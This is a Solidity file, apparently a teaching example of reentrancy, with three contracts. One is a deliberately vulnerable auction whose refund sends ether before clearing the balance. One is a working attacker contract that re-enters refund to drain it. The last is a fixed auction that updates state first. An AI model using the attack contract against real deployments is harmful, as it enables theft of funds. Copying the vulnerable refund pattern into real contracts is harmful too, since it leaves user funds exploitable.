// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract ReentranceAuction {
    uint256 public constant MIN_BID_AMOUNT = 1 ether;

    mapping(address => uint256) public bidders;

    function bid() public payable {
        require(msg.value >= MIN_BID_AMOUNT, "Not enough funds");
        bidders[msg.sender] += MIN_BID_AMOUNT;
    }

    function refund() public payable {
        uint256 amountToRefund = bidders[msg.sender];
        if (amountToRefund > 0) {
            (bool success, ) = msg.sender.call{value: amountToRefund}("");
            require(success, "Transfer failed");
            bidders[msg.sender] = 0;
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getMinBidAmount() public pure returns (uint256) {
        return MIN_BID_AMOUNT;
    }
}

contract ReentranceAttack {
    ReentranceAuction auction;

    constructor(address _auction) {
        auction = ReentranceAuction(_auction);
    }

    receive() external payable {
        // Will not let transaction revert because of reentrancy
        if (auction.getBalance() >= auction.getMinBidAmount()) {
            auction.refund();
        }
    }

    function proxyBid() external payable {
        auction.bid{value: msg.value}();
    }

    function attack() external {
        auction.refund();
    }
}

contract ReentranceProofAuction {
    uint256 public constant MIN_BID_AMOUNT = 1 ether;

    mapping(address => uint256) public bidders;

    function bid() public payable {
        require(msg.value >= MIN_BID_AMOUNT, "Not enough funds");
        bidders[msg.sender] += MIN_BID_AMOUNT;
    }

    function refund() public payable {
        uint256 amountToRefund = bidders[msg.sender];
        if (amountToRefund > 0) {
            // Change balance BEFORE transfer
            bidders[msg.sender] = 0;
            (bool success, ) = msg.sender.call{value: amountToRefund}("");
            require(success, "Transfer failed");
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getMinBidAmount() public pure returns (uint256) {
        return MIN_BID_AMOUNT;
    }
}
